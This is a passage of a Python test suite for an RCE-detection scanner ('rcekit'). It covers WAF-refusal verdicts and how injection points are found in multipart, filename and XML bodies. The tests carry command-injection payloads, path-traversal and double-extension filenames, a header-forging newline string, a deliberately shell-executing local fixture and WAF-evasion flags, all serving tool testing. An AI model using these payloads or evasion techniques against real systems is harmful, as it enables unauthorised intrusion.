        marker = "Fetch the followup again."
        self.assertIn(marker, source,
                      "a retry that lands never re-reads the followup channel")
        window = source[source.index(marker):]
        self.assertLess(window.index("probe.followup"), window.index("obs = Observation("),
                        "the followup is re-read after the observation is built")


class PayloadRefusedTestCase(unittest.TestCase):
    """A probe a filter refused is not a probe that found nothing.

    `negative` asserts that the probes reached the target. A 403 from a WAF
    means they reached a filter, and the sink never saw a payload -- the same
    false clean `nothing-tested` exists to prevent, one level further in.

    Measured against a real command injection behind a filter that 403s a space
    or a separator: every probe refused, and the run reported `negative=10`.
    """

    def test_the_signal_is_differential(self):
        # The control got through and the probe did not, so what was refused is
        # the payload.
        self.assertTrue(rcekit.payload_refused(403, 200))
        self.assertTrue(rcekit.payload_refused(406, 200))
        self.assertTrue(rcekit.payload_refused(429, 302))

    def test_an_endpoint_that_refuses_everything_is_not_a_filter(self):
        """An auth wall, or a path that does not exist for this session.

        Without the differential this is the false positive: every probe would
        be reported as blocked on an endpoint that was simply never open."""
        self.assertFalse(rcekit.payload_refused(403, 403))
        self.assertFalse(rcekit.payload_refused(401, 401))

    def test_a_server_error_is_not_a_refusal(self):
        # A 5xx is as likely to be the payload *breaking* the application, which
        # means it reached something. Reading that as blocked would hide the one
        # response saying the sink is live.
        self.assertFalse(rcekit.payload_refused(500, 200))
        self.assertFalse(rcekit.payload_refused(502, 200))

    def test_a_probe_that_never_arrived_is_not_a_refusal(self):
        self.assertFalse(rcekit.payload_refused(None, 200))
        self.assertFalse(rcekit.payload_refused(403, None))

    def test_a_fully_refused_run_is_never_reported_negative(self):
        self.assertEqual(
            rcekit.overall_detection_verdict([{"verdict": "blocked"}] * 3), "blocked")
        self.assertEqual(
            rcekit.overall_detection_verdict(
                [{"verdict": "blocked"}, {"verdict": "error"}]), "blocked")

    def test_a_run_that_got_some_probes_through_is_a_real_negative(self):
        # The sink saw those and did nothing, which is what `negative` means.
        self.assertEqual(
            rcekit.overall_detection_verdict(
                [{"verdict": "blocked"}] * 9 + [{"verdict": "negative"}]), "negative")

    def test_a_confirmation_still_outranks_everything(self):
        self.assertEqual(
            rcekit.overall_detection_verdict(
                [{"verdict": "blocked"}] * 5 + [{"verdict": "executed"}]), "executed")


class FilteredTargetRunTestCase(unittest.TestCase):
    """The whole path, against a target that is vulnerable behind a filter.

    The unit tests above pin the predicate and the wording. This is the one
    that would have caught the original defect: a real run, a real refusal, and
    the verdict the operator actually reads.
    """

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _filtered(self, blocked_tokens):
        """A route that refuses any payload carrying one of ``blocked_tokens``
        and otherwise echoes, so the control gets through and probes do not."""
        def route(method, path, params, headers, body):
            value = params.get("q", "")
            if any(token in value for token in blocked_tokens):
                return (403, "<html>403 Forbidden: blocked by security policy</html>")
            return (200, f"ok: {value}")
        return route

    def test_a_filtered_run_reports_blocked_not_negative(self):
        with local_target(self._filtered((" ", ";", "`", "|", "&"))) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"],
                max_payloads=6, timeout=15)
        self.assertTrue(results)
        self.assertEqual(rcekit.overall_detection_verdict(results), "blocked",
                         f"verdicts were {[r['verdict'] for r in results]}")
        self.assertEqual(self.gen.refused_probes, len(results))
        self.assertIn(403, self.gen.refused_statuses)

    def test_the_evidence_says_the_sink_never_saw_it(self):
        with local_target(self._filtered((" ", ";", "`", "|", "&"))) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"],
                max_payloads=3, timeout=15)
        detail = results[0]["detail"]
        self.assertIn("403", detail)
        self.assertIn("the sink never saw it", detail)

    def test_an_endpoint_that_refuses_everything_stays_negative(self):
        """The control is refused too, so nothing says the payload was the
        problem. Without the differential this whole run would read as blocked
        on a target that was simply never open."""
        with local_target(lambda *a: (403, "<html>403: authentication required</html>")) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"],
                max_payloads=3, timeout=15)
        self.assertTrue(results)
        self.assertEqual(self.gen.refused_probes, 0)
        self.assertNotIn("blocked", {r["verdict"] for r in results})

    def test_a_target_that_lets_everything_through_records_no_refusal(self):
        with local_target(lambda m, p, params, h, b: (200, f"ok: {params.get('q','')}")) as base:
            self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"],
                max_payloads=3, timeout=15)
        self.assertEqual(self.gen.refused_probes, 0)
        self.assertEqual(self.gen.refused_statuses, {})

    def test_a_confirmation_through_the_filter_still_confirms(self):
        """A filter that misses one shape must not turn the finding into a
        refusal. The verdict is decided per probe, so the one that got through
        keeps its own."""
        def route(method, path, params, headers, body):
            value = params.get("q", "")
            # Only `;` is filtered, so the pipe, chain, newline and raw shapes
            # all still arrive. A filter that blocks every shape is the case
            # above; this is the one that misses.
            if ";" in value:
                return (403, "<html>403 Forbidden</html>")
            return (200, f"ok: {value}")
        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"],
                max_payloads=8, timeout=15)
        self.assertIn("blocked", {r["verdict"] for r in results})
        self.assertNotEqual(rcekit.overall_detection_verdict(results), "blocked",
                            "a run with probes that got through is not blocked")


class RefusalNeverUnmakesEvidenceTestCase(unittest.TestCase):
    """A 4xx does not unmake what the run observed.

    An application can execute the payload and then answer 400 with the output
    in the body -- post-execution validation, an error page that echoes what it
    choked on. The oracle has already proven execution from a value random to
    that probe; replacing that with `blocked` turns demonstrated RCE into a
    false negative, which is the one outcome worse than the false clean this
    verdict was added to remove.

    `negative` is the only verdict a refusal replaces, because it is the only
    one a refusal contradicts: it claims the probes reached the target and
    found nothing.
    """

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def test_a_confirmation_delivered_with_a_4xx_survives(self):
        def route(method, path, params, headers, body):
            value = params.get("q", "")
            if not value.startswith("rcekit-control"):
                # Executes, then rejects: the computed value is in the body of a
                # 400 the payload-free control never gets.
                pipe = sh_popen(value + " 2>&1")
                out = pipe.read()
                pipe.close()
                return (400, f"<html>could not process: {out}</html>")
            return (200, "ok")

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"],
                max_payloads=6, timeout=15)
        verdicts = {r["verdict"] for r in results}
        self.assertIn("executed", verdicts,
                      f"a proven execution was overwritten: {verdicts}")
        self.assertEqual(rcekit.overall_detection_verdict(results), "executed")

    def test_the_refusal_is_still_counted_even_when_it_replaces_nothing(self):
        # The run should still say a filter answered, whatever the verdict was.
        self.test_a_confirmation_delivered_with_a_4xx_survives()
        self.assertGreater(self.gen.refused_probes, 0)

    def test_only_a_negative_is_replaced(self):
        for status in ("executed", "timing-sink", "file-write", "evaluation-sink",
                       "needs-review", "lookup-sink", "deserialization-sink",
                       "inconclusive", "error"):
            with self.subTest(status=status):
                self.assertIsNone(
                    self.gen._refusal(403, 200, rcekit.Verdict(status, "evidence")),
                    f"{status} rests on something observed and must not be replaced")
        self.assertIsNotNone(
            self.gen._refusal(403, 200, rcekit.Verdict("negative", "nothing found")))


class CallbackMethodRefusalTestCase(unittest.TestCase):
    """`oob`, `lookup` and `deser` decide per probe from a series.

    That branch returned before refusal was looked at, so a run whose every
    callback probe was refused reported `negative` for each of them -- because
    no callback arrived. The exact false clean this verdict exists to remove,
    on three of the eight methods, and the three that most look like a clean
    target when they are wrong.
    """

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="java", context="raw")

    def test_a_filtered_callback_run_is_blocked_not_negative(self):
        def route(method, path, params, headers, body):
            value = params.get("q", "")
            if not value.startswith("rcekit-control"):
                return (403, "<html>403 Forbidden</html>")
            return (200, "ok")

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["deser"],
                config={"deser_formats": ["java"]}, max_payloads=4, timeout=15)
        self.assertTrue(results, "precondition: the method must build probes")
        self.assertEqual(rcekit.overall_detection_verdict(results), "blocked",
                         f"verdicts were {[r['verdict'] for r in results]}")
        self.assertGreater(self.gen.refused_probes, 0)

    def test_the_requests_are_counted_not_the_rows(self):
        """An aggregate method fires a ladder and reports few rows, so a tally
        drawn from rows and one drawn from requests describe the same run with
        different arithmetic."""
        def route(method, path, params, headers, body):
            value = params.get("q", "")
            if not value.startswith("rcekit-control"):
                return (403, "<html>403</html>")
            return (200, "ok")

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["deser"],
                config={"deser_formats": ["java"]}, max_payloads=4, timeout=15)
        self.assertEqual(self.gen.refused_probes,
                         sum(self.gen.refused_statuses.values()))
        self.assertGreaterEqual(self.gen.delivered_probes, self.gen.refused_probes)
        self.assertGreaterEqual(self.gen.delivered_probes, len(results))


class RefusedAdviceTestCase(unittest.TestCase):
    """What a filtered run is told, and what it is no longer told.

    "The target may be patched" reads as a clean bill of health for a target
    that was never reached. The blind-sink list names methods a filter refuses
    the same way. The second-order line said the target *accepted* an input it
    rejected with a 403. None of the three describes what happened.
    """

    def test_it_reports_the_count_and_the_statuses(self):
        joined = "\n".join(rcekit.refused_advice(9, 10, {403: 9}, "none"))
        self.assertIn("9 of 10", joined)
        self.assertIn("HTTP 403 x9", joined)

    def test_a_fully_refused_run_is_told_it_learned_nothing(self):
        joined = "\n".join(rcekit.refused_advice(10, 10, {403: 10}, "none", every=True))
        self.assertIn("says nothing about whether the target is vulnerable", joined)

    def test_a_partly_refused_run_is_not(self):
        # Some probes reached the sink, so the run did learn something.
        joined = "\n".join(rcekit.refused_advice(9, 10, {403: 9}, "none", every=False))
        self.assertNotIn("says nothing about whether the target is vulnerable", joined)

    def test_whether_nothing_reached_the_sink_is_the_verdict_not_a_ratio(self):
        """An aggregate method fires a whole ladder and reports one row, so a
        ratio of refusals to rows says nothing about whether anything got
        through. The run's own verdict is where that is decided."""
        joined = "\n".join(rcekit.refused_advice(5, 5, {403: 5}, "none", every=False))
        self.assertNotIn("says nothing about whether the target is vulnerable", joined,
                         "a ratio was used in place of the run's verdict")

    def test_it_names_the_flags_that_change_the_payload_shape(self):
        joined = "\n".join(rcekit.refused_advice(4, 4, {403: 4}, "none"))
        self.assertIn("--evade low", joined)
        self.assertIn("--separators", joined)

    def test_a_rung_already_in_use_is_not_suggested_again(self):
        joined = "\n".join(rcekit.refused_advice(4, 4, {403: 4}, "low"))
        self.assertNotIn("--evade low", joined)
        self.assertIn("--separators", joined)

    def test_nothing_refused_says_nothing(self):
        self.assertEqual(rcekit.refused_advice(0, 10, {}, "none"), [])


class InjectionPointEnumerationTestCase(unittest.TestCase):
    """Expanding one captured request into every candidate injection point.

    `-p NAME` requires the tester to already know which parameter is the sink.
    Real captures carry ten to forty candidates, and some of the highest-value
    classes inject through a header or a JSON leaf several levels down that no
    top-level parameter name addresses."""

    def setUp(self):
        self.req = parse_raw_request(RAW_CAPTURE)

    def _points(self, **kwargs):
        return rcekit.enumerate_injection_points(self.req, **kwargs)

    def test_every_kind_is_found(self):
        found = {(p.kind, p.name) for p in self._points()}
        self.assertIn(("query", "view"), found)
        self.assertIn(("query", "lang"), found)
        self.assertIn(("json", "user.profile.name"), found)
        self.assertIn(("cookie", "sid"), found)
        self.assertIn(("cookie", "theme"), found)
        self.assertIn(("header", "User-Agent"), found)

    def test_json_leaves_are_addressed_by_path_including_arrays(self):
        names = [p.name for p in self._points() if p.kind == "json"]
        self.assertEqual(names, ["user.profile.name", "tags[0]", "tags[1]"])

    def test_order_is_query_then_body_then_cookies_then_headers(self):
        kinds = [p.kind for p in self._points()]
        self.assertEqual(kinds, sorted(kinds, key=lambda k: rcekit.INJECTION_POINT_KINDS.index(k)))

    def test_high_yield_headers_come_first_and_the_rest_need_thorough(self):
        fast = [p.name for p in self._points() if p.kind == "header"]
        self.assertIn("User-Agent", fast)
        self.assertNotIn("X-Trace-Id", fast, "fast order must not sweep every header")
        thorough = [p.name for p in self._points(thorough=True) if p.kind == "header"]
        self.assertIn("X-Trace-Id", thorough)
        self.assertLess(thorough.index("User-Agent"), thorough.index("X-Trace-Id"))

    def test_connection_level_headers_are_never_candidates(self):
        # Injecting into these changes the request's plumbing rather than
        # testing the application, and the delivery layer rebuilds two of them.
        names = {p.name.lower() for p in self._points(thorough=True) if p.kind == "header"}
        for excluded in ("host", "content-length", "connection", "cookie"):
            self.assertNotIn(excluded, names)

    def test_path_segments_are_opt_in(self):
        self.assertFalse([p for p in self._points() if p.kind == "path"])
        segments = [p for p in self._points(include_path_segments=True) if p.kind == "path"]
        self.assertTrue(segments)

    def test_kinds_can_be_narrowed(self):
        self.assertEqual({p.kind for p in self._points(kinds=("header",))}, {"header"})

    def test_a_form_body_yields_form_points_not_json(self):
        raw = RAW_CAPTURE.split("\r\n\r\n")[0].replace(
            "Content-Type: application/json", "Content-Type: application/x-www-form-urlencoded")
        req = parse_raw_request(raw + "\r\n\r\nuser=ali&role=admin")
        points = rcekit.enumerate_injection_points(req)
        self.assertEqual([p.name for p in points if p.kind == "form"], ["user", "role"])
        self.assertFalse([p for p in points if p.kind == "json"])


RAW_MULTIPART = (
    "POST /upload HTTP/1.1\r\n"
    "Host: target.example\r\n"
    "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAbC123\r\n"
    "\r\n"
    "------WebKitFormBoundaryAbC123\r\n"
    'Content-Disposition: form-data; name="user"\r\n'
    "\r\n"
    "alice\r\n"
    "------WebKitFormBoundaryAbC123\r\n"
    'Content-Disposition: form-data; name="avatar"; filename="a.txt"\r\n'
    "Content-Type: text/plain\r\n"
    "\r\n"
    "line one\nline two\r\n"
    "------WebKitFormBoundaryAbC123\r\n"
    'Content-Disposition: form-data; name="note"\r\n'
    "\r\n"
    "hello\r\n"
    "------WebKitFormBoundaryAbC123--\r\n"
)


def _graphql_capture(payload):
    head = ("POST /graphql HTTP/1.1\r\n"
            "Host: target.example\r\n"
            "Content-Type: application/json\r\n\r\n")
    return parse_raw_request(head + json.dumps(payload))


class MultipartInjectionPointTestCase(unittest.TestCase):
    """A multipart body has fields, and until now none of them were tested.

    The form branch split the body on `&` and produced one point named after a
    Content-Disposition line. Every probe for it rewrote a part *header*, so it
    could not confirm anything, while `user`, `avatar` and `note` -- the fields
    the form actually posts -- were never reached. The run still printed a
    point and a probe count, which is the failure that matters: coverage
    reported and not delivered reads exactly like a clean target.
    """

    def setUp(self):
        self.req = parse_raw_request(RAW_MULTIPART)

    def _points(self, **kwargs):
        return rcekit.enumerate_injection_points(self.req, **kwargs)

    def _place(self, name, mark="FUZZ"):
        point = next(p for p in self._points()
                     if p.kind == "multipart" and p.name == name)
        return rcekit.place_injection_point(
            self.req["target"], self.req["headers"], self.req["body"], point, mark)

    def test_every_part_is_a_point_including_the_file_part(self):
        self.assertEqual([p.name for p in self._points() if p.kind == "multipart"],
                         ["user", "avatar", "note"])

    def test_the_form_branch_no_longer_makes_a_point_out_of_a_part_header(self):
        # The counterexample, not just the fix: a point whose name is a
        # Content-Disposition line is the bug's signature.
        names = [p.name for p in self._points()]
        self.assertFalse([p for p in self._points() if p.kind == "form"])
        self.assertFalse([n for n in names if "Content-Disposition" in n],
                         f"a part header is still being offered as a field: {names}")

    def _read_back(self, body):
        """Parse the rendered body with the standard library's MIME parser.

        Not with rcekit's own splitter: a parser and a renderer that are wrong
        in the same direction agree with each other, and the question here is
        whether the application on the other end can read what we send."""
        import email
        ctype = next(v for n, v in self.req["headers"] if n.lower() == "content-type")
        msg = email.message_from_string(f"Content-Type: {ctype}\r\n\r\n{body}")
        self.assertTrue(msg.is_multipart(), "the rendered body is not valid multipart")
        return {part.get_param("name", header="content-disposition"):
                part.get_payload(decode=True).decode("utf-8")
                for part in msg.get_payload()}

    def test_a_part_value_is_replaced_and_the_others_are_left_alone(self):
        _, _, body = self._place("note")
        self.assertEqual(self._read_back(body),
                         {"user": "alice", "avatar": "line one\nline two",
                          "note": "FUZZ"})

    def test_the_part_keeps_its_own_headers(self):
        # The file part is still a file part; we are testing its value, not
        # rewriting what the application thinks it received.
        _, _, body = self._place("avatar")
        self.assertIn('filename="a.txt"', body)
        self.assertIn("Content-Type: text/plain", body)

    def test_the_rendered_body_uses_crlf_and_keeps_content_untouched(self):
        """The line endings a capture loses, and the one it must not invent.

        `parse_raw_request` normalises the whole request to LF, so a multipart
        body read back from a file no longer has the endings it was sent with
        and RFC 2046 wants CRLF between the delimiters and part headers. The
        newline *inside* an uploaded text file is content, and stays."""
        _, _, body = self._place("note")
        self.assertNotIn("\n------WebKitFormBoundaryAbC123",
                         body.replace("\r\n", "\x00"),
                         "a delimiter is preceded by a bare newline")
        self.assertIn("line one\nline two", body)
        self.assertTrue(body.endswith("------WebKitFormBoundaryAbC123--\r\n"))

    def test_a_field_that_is_not_there_places_nothing(self):
        point = rcekit.InjectionPoint("multipart", "absent", "multipart field 'absent'")
        self.assertIsNone(rcekit.place_injection_point(
            self.req["target"], self.req["headers"], self.req["body"], point, "FUZZ"))

    def test_a_probe_and_its_control_differ_only_in_the_field_under_test(self):
        """Both go through the same renderer, so the control holds everything
        else constant -- which is the whole basis on which `executed` rests."""
        _, _, probed = self._place("note", "PAYLOAD")
        _, _, control = self._place("note", "CONTROL")
        self.assertEqual(probed.replace("PAYLOAD", "X"), control.replace("CONTROL", "X"))

    def test_the_kind_can_be_narrowed_like_any_other(self):
        self.assertEqual({p.kind for p in self._points(kinds=("multipart",))},
                         {"multipart"})

    def test_a_body_that_does_not_parse_yields_no_points_rather_than_garbage(self):
        req = parse_raw_request(
            RAW_MULTIPART.split("\r\n\r\n")[0] + "\r\n\r\nnot a multipart body at all")
        self.assertFalse([p for p in rcekit.enumerate_injection_points(req)
                          if p.kind in {"multipart", "form"}])


RAW_MULTIPART_REPEATED = (
    "POST /upload HTTP/1.1\r\n"
    "Host: target.example\r\n"
    "Content-Type: multipart/form-data; boundary=----Bnd\r\n"
    "\r\n"
    "------Bnd\r\n"
    'Content-Disposition: form-data; name="files[]"; filename="a.txt"\r\n'
    "\r\n"
    "AAA\r\n"
    "------Bnd\r\n"
    'Content-Disposition: form-data; name="files[]"; filename="b.txt"\r\n'
    "\r\n"
    "BBB\r\n"
    "------Bnd\r\n"
    'Content-Disposition: form-data; name="files[]"; filename="c.txt"\r\n'
    "\r\n"
    "CCC\r\n"
    "------Bnd\r\n"
    'Content-Disposition: form-data; name="note"\r\n'
    "\r\n"
    "hello\r\n"
    "------Bnd--\r\n"
)


class RepeatedMultipartFieldTestCase(unittest.TestCase):
    """Several parts may post under one name, and each is its own value.

    A multi-file input and a checkbox array both do it. Addressing a part by
    name alone rewrote the *first* one for every candidate, so a form posting
    three files produced three points, probed the first file three times, and
    never touched the other two -- while the run reported three points of
    coverage. That is the same failure this whole change was written to remove,
    one level further in: a probe count that does not mean what it says.

    So the part index is the authority, as `tokens` already is for a JSON leaf.
    """

    def setUp(self):
        self.req = parse_raw_request(RAW_MULTIPART_REPEATED)
        self.points = [p for p in rcekit.enumerate_injection_points(self.req)
                       if p.kind == "multipart"]

    def _values(self, body):
        """The part contents of a rendered body, read back positionally."""
        return [seg.split("\r\n\r\n", 1)[1].rstrip("\r\n")
                for seg in body.split("------Bnd")[1:-1]]

    def test_each_repeated_part_is_its_own_point(self):
        self.assertEqual([p.name for p in self.points],
                         ["files[]", "files[]", "files[]", "note"])
        self.assertEqual([p.tokens for p in self.points],
                         [(0,), (1,), (2,), (3,)])

    def test_each_point_rewrites_its_own_part(self):
        """The counterexample. Before the index, every one of these was `AAA`."""
        placed = []
        for index, point in enumerate(self.points):
            _t, _h, body = rcekit.place_injection_point(
                self.req["target"], self.req["headers"], self.req["body"],
                point, f"MARK{index}")
            placed.append(self._values(body))
        self.assertEqual(placed, [
            ["MARK0", "BBB", "CCC", "hello"],
            ["AAA", "MARK1", "CCC", "hello"],
            ["AAA", "BBB", "MARK2", "hello"],
            ["AAA", "BBB", "CCC", "MARK3"],
        ])

    def test_a_repeated_name_says_which_part_a_finding_came_from(self):
        labels = [p.label for p in self.points]
        self.assertEqual(labels[:3], ["multipart field 'files[]' (part 1)",
                                      "multipart field 'files[]' (part 2)",
                                      "multipart field 'files[]' (part 3)"])
        self.assertEqual(len(set(labels)), len(labels), "two points read alike")

    def test_a_name_posted_once_keeps_the_plain_label(self):
        # The index is not noise in the common case.
        self.assertEqual(self.points[3].label, "multipart field 'note'")

    def test_a_point_that_no_longer_describes_the_body_places_nothing(self):
        # An index without the name it was enumerated under means the body
        # moved underneath the point; rewriting whatever sits there now would
        # attribute a finding to the wrong field.
        point = rcekit.InjectionPoint("multipart", "files[]", "x", (3,))
        self.assertIsNone(rcekit.place_injection_point(
            self.req["target"], self.req["headers"], self.req["body"],
            point, "FUZZ"))


RAW_UPLOAD = (
    "POST /upload HTTP/1.1\r\n"
    "Host: target.example\r\n"
    "Content-Type: multipart/form-data; boundary=----B1\r\n"
    "\r\n"
    "------B1\r\n"
    'Content-Disposition: form-data; name="user"\r\n'
    "\r\n"
    "alice\r\n"
    "------B1\r\n"
    'Content-Disposition: form-data; name="avatar"; filename="a.txt"\r\n'
    "Content-Type: text/plain\r\n"
    "\r\n"
    "line one\r\n"
    "------B1\r\n"
    # Parameter order is free in RFC 7578 and libraries differ, so the
    # filename-first spelling is an ordinary capture rather than a curiosity.
    'Content-Disposition: form-data; filename="second.png"; name="report"\r\n'
    "\r\n"
    "PNGDATA\r\n"
    "------B1--\r\n"
)


class MultipartFilenameInjectionPointTestCase(unittest.TestCase):
    """An upload's filename is a value the application reads, and it had no point.

    Only part *content* was replaceable: `place_injection_point` rebuilt each
    part as `[head, content]` and preserved the header verbatim, so
    `filename="a.txt"` was unreachable. A filename is where a traversal, a
    double extension or a name a converter shells out with has to go, and those
    are the routes from an upload to execution.

    This kind is the inverse of `multipart`: the part header changes and the
    content is left alone."""

    def setUp(self):
        self.req = parse_raw_request(RAW_UPLOAD)
        self.points = rcekit.enumerate_injection_points(self.req)

    def _place(self, index, mark="FUZZ"):
        point = next(p for p in self.points
                     if p.kind == "filename" and p.tokens == (index,))
        return rcekit.place_injection_point(
            self.req["target"], self.req["headers"], self.req["body"], point, mark)[2]

    def test_only_parts_declaring_a_filename_are_candidates(self):
        # The plain `user` field is not an upload and has no filename to probe.
        self.assertEqual([(p.name, p.tokens) for p in self.points if p.kind == "filename"],
                         [("avatar", (1,)), ("report", (2,))])

    def test_a_filename_point_is_labelled_by_the_field_that_carries_it(self):
        labels = [p.label for p in self.points if p.kind == "filename"]
        self.assertEqual(labels, ["multipart filename of 'avatar'",
                                  "multipart filename of 'report'"])

    def test_content_points_still_come_first(self):
        kinds = [p.kind for p in self.points]
        self.assertLess(kinds.index("multipart"), kinds.index("filename"),
                        "a part's content is the higher-yield half of it")

    def test_placement_rewrites_the_header_and_leaves_the_content(self):
        body = self._place(1)
        self.assertIn('name="avatar"; filename="FUZZ"', body)
        self.assertIn("line one", body, "the upload's content is untouched")
        # Every other part survives byte for byte.
        self.assertIn('name="user"', body)
        self.assertIn('filename="second.png"; name="report"', body)

    def test_placement_handles_the_filename_first_spelling(self):
        body = self._place(2)
        self.assertIn('filename="FUZZ"; name="report"', body)
        self.assertIn("PNGDATA", body)
        self.assertIn('filename="a.txt"', body, "the other upload is untouched")

    def test_a_point_that_no_longer_describes_the_body_places_nothing(self):
        point = rcekit.InjectionPoint("filename", "avatar", "x", (2,))
        self.assertIsNone(rcekit.place_injection_point(
            self.req["target"], self.req["headers"], self.req["body"], point, "FUZZ"))

    def test_a_part_with_no_filename_places_nothing(self):
        point = rcekit.InjectionPoint("filename", "user", "x", (0,))
        self.assertIsNone(rcekit.place_injection_point(
            self.req["target"], self.req["headers"], self.req["body"], point, "FUZZ"))

    def test_the_kind_can_be_narrowed(self):
        only = rcekit.enumerate_injection_points(self.req, kinds=("filename",))
        self.assertEqual({p.kind for p in only}, {"filename"})
        without = rcekit.enumerate_injection_points(self.req, kinds=("multipart",))
        self.assertFalse([p for p in without if p.kind == "filename"])

    def test_the_point_names_its_own_encoder(self):
        # A filename sits in a part header, so its escaping is a property of
        # the position rather than of the body -- the same reason an XML point
        # names one.
        point = next(p for p in self.points if p.kind == "filename")
        self.assertEqual(rcekit.point_body_location(point), "multipart_filename")
        content = next(p for p in self.points if p.kind == "multipart")
        self.assertIsNone(rcekit.point_body_location(content))


class MultipartFilenameEncodingTestCase(unittest.TestCase):
    """Three characters cannot reach a part header as themselves.

    The quote and the backslash are syntax: RFC 7578's quoted-string form needs
    them escaped, or the name is truncated at the payload's own quote. CR and LF
    are a safety matter and not a syntactic one -- a newline in a part header
    does not corrupt the request, it *forges a new part*, which is a different
    vulnerability and one no notice afterwards can undo."""

    def setUp(self):
        self.kit = RCEKit()

    def _encode(self, payload):
        return self.kit._encode_for_location(payload, "multipart_filename")

    def test_the_payloads_this_kind_exists_for_pass_through_untouched(self):
        # A traversal and a double extension are the point of the kind, and
        # neither contains a character the header reserves.
        for payload in ("../../../webroot/x.jsp", "x.jsp.", "shell.php%00.png",
                        "; id", "$(id)", "a|b&&c"):
            self.assertEqual(self._encode(payload), payload)

    def test_a_quote_is_escaped_rather_than_dropped(self):
        # The Windows `for /f "delims="` probe carries quotes, so dropping such
        # probes would cost the cmd.exe dialect this whole carrier.
        self.assertEqual(self._encode('a"b'), 'a\\"b')
        self.assertIn('\\"delims=\\"', self._encode('for /f "delims=" %i in (1) do x'))

    def test_the_backslash_is_escaped_before_the_quote(self):
        # Order matters: escaping the quote first would then escape the escape
        # it just added.
        self.assertEqual(self._encode("a\\b"), "a\\\\b")
        self.assertEqual(self._encode('a\\"b'), 'a\\\\\\"b')

    def test_a_newline_cannot_forge_a_part(self):
        forged = 'x.txt\r\n\r\n------B1\r\nContent-Disposition: form-data; name="evil"'
        encoded = self._encode(forged)
        self.assertNotIn("\r", encoded)
        self.assertNotIn("\n", encoded)
        self.assertEqual(self._encode("a\r\nb"), "a  b")

    def test_an_encoded_filename_round_trips_through_the_readers(self):
        # Whatever the escaping produces has to be a filename RCEKit's own
        # parsers still read back, or a finding would name a value nobody sent.
        head = ('Content-Disposition: form-data; name="f"; filename="'
                + self._encode('a"b') + '"')
        self.assertEqual(rcekit._multipart_field_name(head), "f")
        self.assertEqual(rcekit._multipart_filename(head), 'a\\"b')


class MultipartDispositionOrderTestCase(unittest.TestCase):
    """`filename` ends in `name`, and the field-name pattern had no boundary.

    Pre-existing, and found while building the filename kind rather than
    reported: `form-data; filename="second.png"; name="report"` enumerated as a
    field called `second.png`, because an unanchored `name="..."` matches inside
    `filename="..."`. Parameter order is free in RFC 7578 and libraries differ.

    It is fixed here rather than separately because the filename kind uses the
    field name as its identity and as the key its placement re-checks, so the
    new kind is wrong without it. The near neighbours are the two orderings and
    the part that has only a name."""

    def _field(self, disposition):
        return rcekit._multipart_field_name("Content-Disposition: " + disposition)

    def test_the_field_name_is_read_in_either_parameter_order(self):
        self.assertEqual(self._field('form-data; name="avatar"; filename="a.txt"'), "avatar")
        self.assertEqual(self._field('form-data; filename="a.txt"; name="avatar"'), "avatar")

    def test_a_filename_is_not_mistaken_for_the_field_name(self):
        # The exact failure: before the boundary, this returned "second.png".
        self.assertEqual(self._field('form-data; filename="second.png"; name="report"'),
                         "report")

    def test_a_part_with_only_a_filename_has_no_field_name(self):
        self.assertIsNone(self._field('form-data; filename="orphan.txt"'))

    def test_a_disposition_with_no_space_before_the_parameter_still_reads(self):
        self.assertEqual(rcekit._multipart_field_name('Content-Disposition:name="x"'), "x")

    def test_an_unquoted_parameter_is_not_read(self):
        # Quoted form only, as before: RFC 7578 requires the quotes and every
        # library that writes a multipart body emits them.
        self.assertIsNone(self._field("form-data; name=plain"))
        self.assertIsNone(rcekit._multipart_filename("Content-Disposition: form-data; "
                                                     "name=\"f\"; filename=plain.txt"))


SOAP_BODY = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
    "  <soap:Body>\n"
    '    <getUser id="42" realm=\'corp\'>\n'
    "      <name>alice</name>\n"
    "      <note><![CDATA[free text]]></note>\n"
    "    </getUser>\n"
    "    <items>\n"
    '      <item sku="a1">one</item>\n'
    '      <item sku="b2">two</item>\n'
    "    </items>\n"
    "  </soap:Body>\n"
    "</soap:Envelope>"
)

RAW_SOAP = (
    "POST /services/user HTTP/1.1\r\n"
    "Host: target.example\r\n"
    "Content-Type: text/xml; charset=utf-8\r\n"
    "SOAPAction: getUser\r\n"
    "\r\n"
    + SOAP_BODY
)


class XmlInjectionPointTestCase(unittest.TestCase):
    """An XML body had one injection point, and it was not a real one.

    No branch recognised XML, so an envelope fell through to the form branch --
    which it reaches because a prolog and every attribute contain `=`. Splitting
    it on `&` produced exactly one point named `<?xml version`, and every probe
    for it rewrote the prolog. The run printed a point and a probe count while
    no element or attribute in the document was ever tested, which is the
    failure that matters: coverage reported and not delivered reads exactly like
    a clean target.
    """

    def setUp(self):
        self.req = parse_raw_request(RAW_SOAP)
        self.body = self.req["body"]

    def _points(self, **kwargs):
        return rcekit.enumerate_injection_points(self.req, **kwargs)

    def _xml(self, **kwargs):
        return [p for p in self._points(**kwargs) if p.kind == "xml"]

    def _place(self, name, mark="FUZZ"):
        point = next(p for p in self._xml() if p.name == name)
        return rcekit.place_injection_point(
            self.req["target"], self.req["headers"], self.body, point, mark)

    def test_elements_attributes_and_cdata_are_all_candidates(self):
        found = {p.name for p in self._xml()}
        self.assertIn("soap:Envelope/soap:Body/getUser/name", found)
        self.assertIn("soap:Envelope/soap:Body/getUser/@id", found)
        self.assertIn("soap:Envelope/soap:Body/getUser/@realm", found)
